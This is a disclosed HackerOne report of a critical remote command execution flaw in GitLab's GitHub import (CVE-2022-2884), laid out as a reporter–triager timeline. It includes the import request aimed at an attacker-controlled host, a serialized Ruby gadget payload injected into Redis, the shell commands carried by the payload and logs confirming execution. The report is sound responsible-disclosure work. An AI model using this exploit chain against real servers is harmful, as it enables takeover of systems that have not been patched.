---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
date: 2022-10-06
submitted: 2022-08-25T04:07:52.077Z
bounty_usd: 33510
votes: 392
cve: "CVE-2022-2884"
program: "[[programs/gitlab|GitLab]]"
reporter: "vakzz"
source: "https://hackerone.com/reports/1679624"
title: "Remote Command Execution via Github import"
---
# Remote Command Execution via Github import

> **Severity:** Critical | **Bounty:** 33,510 USD | **Votes:** 392 | **Program:** GitLab | **Disclosed:** 2022-10-06

- Report: [https://hackerone.com/reports/1679624](https://hackerone.com/reports/1679624)
- CWE: Command Injection - Generic | CVE: CVE-2022-2884
- Submitted: 2022-08-25T04:07:52.077Z

## Timeline

- **Report Filed**
- **2022-08-25** @vakzz: I have not tested this on gitlab.com at the request of @dcouture since injecting redis commands can have follow on effects and break subsequent commands. I believe it should be vulnerable though from what I can see.

Cheers,
Will
- **2022-08-25** @rshambhuni: Hello @vakzz, thanks for this report! I'm trying to reproduce this on my latest Omnibus installation. I'll let you know if I have any questions.
- **2022-08-25** @rshambhuni: @vakzz I’m at Step 11 of steps to reproduce and I don’t see the payload, `;touch /home/shambho/pwned.txt;# `, execute on my VM. 

All the steps until Step 10 work as you described. I see the project getting imported under the `target_namespace`. See {F1883274}

I'm seeing the error, `comparison of String with 0 failed` in `/var/log/gitlab/gitlab-rails/exceptions_json.log`. See {F1883273}

The following are the curl commands I'm using:
```
curl --request POST --url "http://gitlab.example.com/api/v4/import/github" --header "content-type: application/json" --header "PRIVATE-TOKEN: GITLAB_TOKEN" --data "{\"personal_access_token\": \"fake_token\",\"repo_id\": \"12345\",\"target_namespace\": \"test-group\",\"new_name\": \"gh-import-764\",\"github_hostname\": \"NGROK_URL\"}"

curl -v 'http://gitlab.example.com/test-group' -H 'Cookie: _gitlab_session=SESSION_ID'
```

Payload generated using `gen_payload3.rb` is:
```
"ggg\r\n*3\r\n$3\r\nset\r\n$47\r\nsession:gitlab:SESSION_ID\r\n$341\r\n\u0004\b[\bc\u0015Gem::SpecFetcherc\u0013Gem::InstallerU:\u0015Gem::Requirement[\u0006o:\u001cGem::Package::TarReader\u0006:\b@ioo:\u0014Net::BufferedIO\u0007;\u0007o:#Gem::Package::TarReader::Entry\u0007:\n@readi\u0000:\f@headerI\"\baaa\u0006:\u0006ET:\u0012@debug_outputo:\u0016Net::WriteAdapter\u0007:\f@socketo:\u0014Gem::RequestSet\u0007:\n@setso;\u000e\u0007;\u000fm\u000bKernel:\u000f@method_id:\u000bsystem:\r@git_setI\"&;touch /home/shambho/pwned.txt;# \u0006;\fT;\u0012:\fresolve"
```

I'm reproducing this on the latest Omnibus installation, 15.3.1, on my Ubuntu VM. Let me know how if you have any ideas on where I may be going wrong?
- **2022-08-25** @vakzz: Hi @rshambhuni,

Would you be able to open a rails console with `sudo gitlab-rails console` and see if the redis key has been set (replacing gggg with the value you used):

```ruby
Gitlab::Redis::Cache.with { |r| r.get("session:gitlab:gggg") }
```
 
It should return the payload if the injection worked. Maybe the session id has to be lowercase? Are there any errors in the log about a redis error? Something similar to `ERR unknown command` (will start with `ERR`).

Cheers,
Will
- **2022-08-25** @rshambhuni: ```ruby
Gitlab::Redis::Cache.with { |r| r.get("session:gitlab:14e24d14563863445114a95e195f1144") }
```
The above command returned the payload as you suggested. See screenshot below:
{F1883355}

I unfortunately don't see the `pwned.txt` file created in my home directory though. Not sure if this is an issue with my local Omnibus installation?
- **2022-08-25** @vakzz: Oh gitlab is running as the `git` user, maybe it can’t write to your home directory? Try something like `id > /tmp/pwned.txt` as the command instead?

Cheers, Will
- **2022-08-25** @rshambhuni: @vakzz I tried `echo pwned > /tmp/pwned.txt` command as well but still no luck. I don't see `pwned.txt` under `/tmp`. See attached screenshot:
{F1883458}

Attaching my {F1883460}, {F1883461} and {F1883462} files for your reference. {F1883462} is the payload generated when I run `ruby gen_payload3.rb > payload.txt`.
- **2022-08-25** @vakzz: @rshambhuni Ok I think I see what's happening, the command is being executed with `sh -c 'COMMAND'` and when it starts with a `;` then it has an invalid syntax error:

```bash
vagrant@gitlab:~$ sh -c ';echo pwned > /tmp/pwned.txt;;# '
sh: -c: line 0: syntax error near unexpected token `;'
sh: -c: line 0: `;echo pwned > /tmp/pwned.txt;;# '
vagrant@gitlab:~$
```

Try just using `echo pwned > /tmp/pwned.txt` directly without any other characters, eg `rs.instance_variable_set('@git_set', 'echo pwned > /tmp/pwned.txt');` (you can confirm that it is valid by passing the same string to `sh -c 'COMMAND'` and seeing if it is successful).

To test the unmarshal gadget you could try to manually run it in a rails console with:

```ruby
Gitlab::Redis::Cache.with { |r| Marshal.load(r.get("session:gitlab:14e24d14563863445114a95e195f1144")) }
```

or add `Marshal.load(payload)` to the end of the `gen_payload3.rb` script which will try to execute it (there will be some errors but the shell script should still run).

Cheers,
Will
- **2022-08-25** @rshambhuni: @vakzz Still no luck getting the RCE when I set `rs.instance_variable_set('@git_set', 'echo pwned > /tmp/pwned.txt')` in `gen_payload3.rb`. Attaching my files with this comment again - {F1883531}, {F1883532}, {F1883533}

```ruby
Gitlab::Redis::Cache.with { |r| Marshal.load(r.get("session:gitlab:14e24d14563863445114a95e195f1144")) }
```
Running the above unmarshal gadget manually from the rails console is creating a `pwned.txt` file in `/tmp` though so looks like payload is set correctly. Not sure why it isn't firing when I run the curl command to trigger it?

`curl -v 'http://gitlab.example.com/test-group' -H 'Cookie: _gitlab_session=14e24d14563863445114a95e195f1144'`
- **2022-08-25** @vakzz: Hmm everything looks good, I ran the same payload and server as you and the curl command returns a 500 error and the payload is run:
```
curl -v 'http://gitlab.wbowling.info/test-group' -H 'Cookie: _gitlab_session=14e24d14563863445114a95e195f1144'
*   Trying 192.168.0.122:80...
* Connected to gitlab.wbowling.info (192.168.0.122) port 80 (#0)
> GET /test-group HTTP/1.1
> Host: gitlab.wbowling.info
> User-Agent: curl/7.77.0
> Accept: */*
> Cookie: _gitlab_session=14e24d14563863445114a95e195f1144
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 500 Internal Server Error
< Server: nginx
< Date: Thu, 25 Aug 2022 11:30:41 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 3049
< Connection: keep-alive
< X-Gitlab-Custom-Error: 1
< X-Request-Id: 01GBAC9H825Z39Z1RFXMBN11M3
< X-Runtime: 0.179455
< 
```

From `sudo gitlab-ctl tail`:

```
==> /var/log/gitlab/gitlab-rails/production.log <==
Started GET "/test-group" for 192.168.0.149 at 2022-08-25 11:30:41 +0000

==> /var/log/gitlab/puma/puma_stderr.log <==
sh: reading: command not found

==> /var/log/gitlab/gitlab-rails/production.log <==

TypeError (no implicit conversion of nil into String):

lib/gitlab/database/load_balancing/rack_middleware.rb:68:in `sticking_namespaces'
lib/gitlab/database/load_balancing/rack_middleware.rb:39:in `unstick_or_continue_sticking'
lib/gitlab/database/load_balancing/rack_middleware.rb:21:in `call'
lib/gitlab/middleware/rails_queue_duration.rb:33:in `call'
lib/gitlab/metrics/rack_middleware.rb:16:in `block in call'
lib/gitlab/metrics/web_transaction.rb:46:in `run'
lib/gitlab/metrics/rack_middleware.rb:16:in `call'
lib/gitlab/jira/middleware.rb:19:in `call'
lib/gitlab/middleware/go.rb:20:in `call'
lib/gitlab/etag_caching/middleware.rb:21:in `call'
lib/gitlab/middleware/query_analyzer.rb:11:in `block in call'
lib/gitlab/database/query_analyzer.rb:37:in `within'
lib/gitlab/middleware/query_analyzer.rb:11:in `call'
lib/gitlab/middleware/multipart.rb:173:in `call'
lib/gitlab/middleware/read_only/controller.rb:50:in `call'
lib/gitlab/middleware/read_only.rb:18:in `call'
lib/gitlab/middleware/same_site_cookies.rb:27:in `call'
lib/gitlab/middleware/handle_malformed_strings.rb:21:in `call'
lib/gitlab/middleware/basic_health_check.rb:25:in `call'
lib/gitlab/middleware/handle_ip_spoof_attack_error.rb:25:in `call'
lib/gitlab/middleware/request_context.rb:21:in `call'
lib/gitlab/middleware/webhook_recursion_detection.rb:15:in `call'
config/initializers/fix_local_cache_middleware.rb:11:in `call'
lib/gitlab/middleware/compressed_json.rb:26:in `call'
lib/gitlab/middleware/rack_multipart_tempfile_factory.rb:19:in `call'
lib/gitlab/middleware/sidekiq_web_static.rb:20:in `call'
lib/gitlab/metrics/requests_rack_middleware.rb:77:in `call'
lib/gitlab/middleware/release_env.rb:13:in `call'
```

And the file is created:
```
vagrant@gitlab:~$ cat /tmp/pwned.txt
pwned
```

Unless your cookie name is something other than `_gitlab_session` for some reason? If you do a `curl -v 'http://gitlab.wbowling.info/test-group'` (for your host) does it use `_gitlab_session` for the cookie? `Set-Cookie: _gitlab_session=828ea5fe1ef1b668cd9d09922a8cd285; path=/; expires=Thu, 25 Aug 2022 13:36:25 GMT; HttpOnly`.

There are probably other redis keys that could be used, this was just the simplest to target but not sure why it's not working for you.

Cheers,
Will
- **2022-08-25** @rshambhuni: @vakzz I did a `curl -v 'http://gitlab.example.com/test-group'` and the cookie is being set as `_gitlab_session` so no issues there either. I'm thinking this could be an issue with my Ubuntu VM that is running the Omnibus instance. We will have to reproduce this report on a different instance as a sanity check.
- **2022-08-25** @dcouture: Hello @vakzz,

Thank you for submitting this report.

We have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at <issue link>.  This issue will be made public 30 days following the release of a patch.

Given the severity of the report, we are paying an initial $1000 on triage. Congratulations!

We will continue to update you via HackerOne as a patch is scheduled for release.

Best regards,
Dominic
GitLab Security Team
- **Bounty Awarded**
- **Report Triaged**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
